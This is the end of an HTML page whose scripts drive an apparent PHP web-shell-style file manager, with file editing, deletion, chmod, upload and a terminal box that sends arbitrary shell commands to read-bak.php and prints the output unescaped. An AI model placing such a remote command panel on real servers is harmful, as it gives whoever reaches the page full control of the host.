                <div id="terminal-output" class="mb-2" style="height: 300px; overflow-y: auto; background-color: #000; color: #fff; padding: 10px;"></div>
                <input type="text" class="form-control" id="terminal-input" placeholder="Enter command">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="runCommandBtn">Run Command</button>
            </div>
        </div>
    </div>
</div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
    $(document).ready(function() {
    //Edit button click handler
        $('.edit-btn').click(function() {
            var file = $(this).data('file');
            $.post('read.php', {action: 'get_content', file: file}, function(response) {
                var data = JSON.parse(response);
                if (data.error) {
                    alert(data.error);
                } else {
                    $('#editModal .modal-body textarea').val(data.content);
                    $('#editModal .modal-title').text('Edit ' + decodeURIComponent(file.split('/').pop()));
                    $('#editModal').data('file', file);
                    $('#editModal').modal('show');
                }
            });
        });

        // Save edit changes
        $('#saveEdit').click(function() {
            var file = $('#editModal').data('file');
            var content = $('#fileContent').val();
            $.post('read.php', {action: 'save', file: file, content: content}, function(response) {
                var data = JSON.parse(response);
                alert(data.message || data.error);
                $('#editModal').modal('hide');
            });
        });

        // Rename button click handler
        // $(document).on('click', '.rename-btn', function(e) {
        //     e.preventDefault();
        //     console.log("Rename button clicked");
            
        //     var file = $(this).data('file');
        //     var isDir = $(this).data('is-dir') === 1;
        //     console.log("File:", file);
        //     console.log("Is Directory:", isDir);
            
        //     $('#renameModal .modal-title').text('Rename ' + (isDir ? 'folder' : 'file') + ': ' + decodeURIComponent(file.split('/').pop()));
        //     $('#oldFileName').val(file);
        //     $('#newFileName').val(decodeURIComponent(file.split('/').pop()));
        //     $('#renameModal').data('is-dir', isDir);
            
        //     console.log("About to show modal");
        //     $('#renameModal').modal('show');
        //     console.log("Modal shown");
        // });

        // Save rename
        // $('#saveRename').on('click', function(e) {
        //     e.preventDefault();
        //     console.log("Save rename clicked");
            
        //     var oldName = $('#oldFileName').val();
        //     var newName = $('#newFileName').val();
        //     var isDir = $('#renameModal').data('is-dir');
            
        //     console.log("Old name:", oldName);
        //     console.log("New name:", newName);
        //     console.log("Is Directory:", isDir);
            
        //     $.ajax({
        //         url: 'read.php',
        //         method: 'POST',
        //         data: {
        //             action: 'rename',
        //             oldName: oldName,
        //             newName: newName,
        //             is_dir: isDir ? 1 : 0
        //         },
        //         dataType: 'json',
        //         success: function(response) {
        //             console.log("Rename response received:", response);
        //             if (response.message) {
        //                 alert(response.message);
        //                 closeRenameModal();
        //                 location.reload();
        //             } else if (response.error) {
        //                 alert("Error: " + response.error);
        //             }
        //         },
        //         error: function(xhr, status, error) {
        //             console.error("Rename request failed:", status, error);
        //             console.log("Response text:", xhr.responseText);
        //             alert("Error: " + error + ". Check console for details.");
        //         }
        //     });
        // });

        // //Function to close the modal
        // function closeRenameModal() {
        //     var renameModal = bootstrap.Modal.getInstance(document.getElementById('renameModal'));
        //     if (renameModal) {
        //         renameModal.hide();
        //     }
        // }

        // // Close button click handler
        // $('.btn-close, .btn-secondary', '#renameModal').on('click', function() {
        //     closeRenameModal();
        // });

        // // Close modal when clicking outside
        // $('#renameModal').on('click', function(e) {
        //     if ($(e.target).hasClass('modal')) {
        //         closeRenameModal();
        //     }
        // });

//     $(document).on('click', '.rename-btn', function(e) {
//     e.preventDefault();
//     console.log("Rename button clicked");
    
//     var file = $(this).data('file');
//     var isDir = $(this).data('is-dir') === 1;
//     console.log("File:", file);
//     console.log("Is Directory:", isDir);
    
//     $('#renameModal .modal-title').text('Rename ' + (isDir ? 'folder' : 'file') + ': ' + decodeURIComponent(file.split('/').pop()));
//     $('#oldFileName').val(file);
//     $('#renameNewFileName').val(decodeURIComponent(file.split('/').pop()));
//     $('#renameModal').data('is-dir', isDir);
    
//     console.log("About to show modal");
//     $('#renameModal').modal('show');
//     console.log("Modal shown");
// });

// $('#saveRename').on('click', function(e) {
//     e.preventDefault();
//     console.log("Save rename clicked");
    
//     var oldName = $('#oldFileName').val();
//     var newName = $('#renameNewFileName').val();
//     var isDir = $('#renameModal').data('is-dir');
    
//     console.log("Old name:", oldName);
//     console.log("New name:", newName);
//     console.log("Is Directory:", isDir);
    
//     $.ajax({
//         url: 'read-bak.php',
//         method: 'POST',
//         data: {
//             action: 'rename',
//             oldName: oldName,
//             newName: newName,
//             is_dir: isDir ? 1 : 0
//         },
//         dataType: 'json',
//         success: function(response) {
//             console.log("Rename response received:", response);
//             if (response.success) {
//                 alert(response.message);
//                 $('#renameModal').modal('hide');
//                 location.reload();
//             } else {
//                 alert("Error: " + response.message);
//             }
//         },
//         error: function(xhr, status, error) {
//             console.error("Rename request failed:", status, error);
//             console.log("Response text:", xhr.responseText);
//             alert("Error: " + error + ". Check console for details.");
//         }
//     });
// });

$(document).on('click', '.rename-btn', function(e) {
    e.preventDefault();
    console.log("Rename button clicked");
    
    var file = $(this).data('file');
    var isDir = $(this).data('is-dir') === 1;
    var basename = file.split('\\').pop().split('/').pop(); // Handle both Windows and Unix-style paths
    
    console.log("File:", file);
    console.log("Basename:", basename);
    console.log("Is Directory:", isDir);
    
    $('#renameModal .modal-title').text('Rename ' + (isDir ? 'folder' : 'file') + ': ' + decodeURIComponent(basename));
    $('#oldFileName').val(file); // Keep the full path in the hidden input
    $('#renameNewFileName').val(decodeURIComponent(basename)); // Set only the basename in the visible input
    $('#renameModal').data('is-dir', isDir);
    
    console.log("About to show modal");
    $('#renameModal').modal('show');
    console.log("Modal shown");
});

$('#saveRename').on('click', function(e) {
    e.preventDefault();
    console.log("Save rename clicked");
    
    var oldName = $('#oldFileName').val(); // This is the full path
    var newBasename = $('#renameNewFileName').val(); // This is just the basename
    var isDir = $('#renameModal').data('is-dir');
    
    // Construct the new full path
    var lastSeparatorIndex = Math.max(oldName.lastIndexOf('/'), oldName.lastIndexOf('\\'));
    var newName = oldName.substring(0, lastSeparatorIndex + 1) + newBasename;
    
    console.log("Old name:", oldName);
    console.log("New name:", newName);
    console.log("Is Directory:", isDir);
    
    $.ajax({
        url: 'read-bak.php',
        method: 'POST',
        data: {
            action: 'rename',
            oldName: oldName,
            newName: newName,
            is_dir: isDir ? 1 : 0
        },
        dataType: 'json',
        success: function(response) {
            console.log("Rename response received:", response);
            if (response.success) {
                alert(response.message);
                $('#renameModal').modal('hide');
                location.reload();
            } else {
                alert("Error: " + response.message);
            }
        },
        error: function(xhr, status, error) {
            console.error("Rename request failed:", status, error);
            console.log("Response text:", xhr.responseText);
            alert("Error: " + error + ". Check console for details.");
        }
    });
});

        // Delete button click handler
        $(document).on('click', '.delete-btn', function() {
            var file = $(this).data('file');
            var isDir = $(this).data('is-dir') === 1;
            if (confirm('Are you sure you want to delete this ' + (isDir ? 'folder' : 'file') + ': ' + decodeURIComponent(file.split('/').pop()) + '?')) {
                $.post('read.php', {action: 'delete', file: file, is_dir: isDir ? 1 : 0}, function(response) {
                    var data = JSON.parse(response);
                    alert(data.message || data.error);
                    location.reload();
                });
            }
        });

        // Chmod button click handler
        $(document).on('click', '.chmod-btn', function() {
            var file = $(this).data('file');
            var isDir = $(this).data('is-dir') === 1;
            $('#chmodModal .modal-title').text('Change permissions for ' + (isDir ? 'folder' : 'file') + ': ' + decodeURIComponent(file.split('/').pop()));
            $('#chmodFileName').val(file);
            $('#chmodIsDir').val(isDir ? 1 : 0);
            $('#chmodModal').modal('show');
        });

        // Save chmod
        $('#saveChmod').click(function() {
            var file = $('#chmodFileName').val();
            var permissions = $('#permissions').val();
            var isDir = $('#chmodIsDir').val() === '1';
            $.post('read.php', {action: 'chmod', file: file, permissions: permissions, is_dir: isDir ? 1 : 0}, function(response) {
                var data = JSON.parse(response);
                alert(data.message || data.error);
                $('#chmodModal').modal('hide');
            });
        });

        // Theme switch
        const toggleSwitch = document.querySelector('.theme-switch input[type="checkbox"]');

        function switchTheme(e) {
            if (e.target.checked) {
                document.body.classList.remove('light-mode');
                localStorage.setItem('theme', 'dark');
            } else {
                document.body.classList.add('light-mode');
                localStorage.setItem('theme', 'light');
            }    
        }

        toggleSwitch.addEventListener('change', switchTheme, false);

        // Check for saved user preference, if any, on load of the website
        const currentTheme = localStorage.getItem('theme');
        if (currentTheme) {
            if (currentTheme === 'light') {
                document.body.classList.add('light-mode');
                toggleSwitch.checked = false;
            }
        }
    });

    
    document.getElementById('createFolderBtn').addEventListener('click', function() {
    var folderName = document.getElementById('newFolderName').value;
    fetch('read-bak.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'action=create_folder&folder_name=' + encodeURIComponent(folderName)
    })
    .then(response => response.json())
    .then(data => {
        alert(data.message);
        if (data.success) {
            // Close the modal
            var modal = bootstrap.Modal.getInstance(document.getElementById('newFolderModal'));
            modal.hide();
            
            // Refresh the page
            window.location.reload(true);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while creating the folder.');
    });
});

//Create file
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM fully loaded and parsed');

    var createFileBtn = document.getElementById('createFileBtn');
    var newFileNameInput = document.getElementById('newFileName');
    var newFileContentInput = document.getElementById('newFileContent');
    var newFileModal = document.getElementById('newFileModal');

    if (createFileBtn) {
        console.log('Create File button found');
        createFileBtn.addEventListener('click', handleCreateFile);
    } else {
        console.error('Create File button not found');
    }

    if (newFileNameInput) {
        newFileNameInput.addEventListener('input', function() {
            console.log('File name input changed:', this.value);
        });
    } else {
        console.error('File name input field not found');
    }
    function handleCreateFile() {
    console.log('Create File button clicked');

    var fileName = newFileNameInput ? newFileNameInput.value.trim() : '';
    var fileContent = newFileContentInput ? newFileContentInput.value : '';

    console.log('File name:', fileName);
    console.log('File content:', fileContent);

    if (!fileName) {
        console.log('File name is empty');
        alert('Please enter a file name');
        return;
    }

    var formData = new FormData();
    formData.append('action', 'create_file');
    formData.append('file_name', fileName);
    formData.append('content', fileContent);

    fetch('read-bak.php', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        console.log('Response status:', response.status);
        return response.text();
    })
    .then(text => {
        console.log('Raw response:', text);
        return JSON.parse(text);
    })
    .then(data => {
        console.log('Parsed data:', data);
        if (data.success) {
            alert(data.message);
            var modal = bootstrap.Modal.getInstance(document.getElementById('newFileModal'));
            if (modal) {
                modal.hide();
            }
            window.location.reload(true);
        } else {
            alert('Error: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Fetch request failed:', error);
        alert('Request failed. Please try again.');
    });

}
    

    
// Modal event listener
if (newFileModal) {
        newFileModal.addEventListener('show.bs.modal', function () {
            console.log('Modal is about to be shown');
            // Clear inputs when modal is opened
            if (newFileNameInput) newFileNameInput.value = '';
            if (newFileContentInput) newFileContentInput.value = '';
        });
    } else {
        console.error('New File Modal not found');
    }
});

   

function getCurrentDirectory() {
    return new URLSearchParams(window.location.search).get('dir') || '';
}

document.getElementById('uploadFileBtn').addEventListener('click', function() {
    var fileInput = document.getElementById('fileToUpload');
    var file = fileInput.files[0];
    if (file) {
        var formData = new FormData();
        formData.append('action', 'upload_file');
        formData.append('file', file);
        fetch('', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            alert(data.message);
            if (data.success) {
                // Close the modal
                var modal = bootstrap.Modal.getInstance(document.getElementById('uploadFileModal'));
                modal.hide();
                
                // Refresh the page
                window.location.reload(true);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while uploading the file.');
        });
    } else {
        alert('Please select a file to upload.');
    }
});

document.getElementById('runCommandBtn').addEventListener('click', function() {
    var command = document.getElementById('terminal-input').value;
    fetch('read-bak.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'action=execute_command&command=' + encodeURIComponent(command)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('terminal-output').innerHTML += '<p>> ' + command + '</p>';
            document.getElementById('terminal-output').innerHTML += '<pre>' + data.output + '</pre>';
        } else {
            alert('Error executing command');
        }
    });
});
    </script>
</body>
</html>